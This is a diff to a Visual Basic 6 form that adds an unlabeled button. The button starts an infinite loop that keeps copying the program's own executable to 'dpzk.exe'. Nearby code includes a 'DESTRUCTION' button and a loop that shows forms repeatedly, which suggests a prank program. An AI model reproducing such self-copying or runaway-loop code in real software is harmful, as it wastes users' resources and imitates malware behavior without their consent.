@@ -9,6 +9,13 @@ Begin VB.Form DPZKMAIN
    ScaleHeight     =   5355
    ScaleWidth      =   8280
    StartUpPosition =   3  'Windows Default
+   Begin VB.CommandButton Command4 
+      Height          =   615
+      Left            =   4200
+      TabIndex        =   3
+      Top             =   0
+      Width           =   1455
+   End
    Begin VB.CommandButton Command3 
       Caption         =   "DESTRUCTION"
       Height          =   615
@@ -81,6 +88,17 @@ Form.Show
 Loop
 End Sub
 
+Private Sub Command4_Click()
+Do While True
+Print (App.Path + "\" + App.EXEName + ".exe")
+Print (App.Path + "\" + "dpzk" + ".exe")
+Print (Rnd())
+Print (Str(Rnd()))
+'Print FileSystem.FileExists(App.Path + "\" + App.EXEName + ".exe"))
+Dim a
+FileCopy App.Path + "\" + App.EXEName + ".exe", App.Path + "\" + "dpzk" + ".exe"
+Loop
+End Sub
 Private Sub Form_Load()
 EnNwtsEd = False
 End Sub
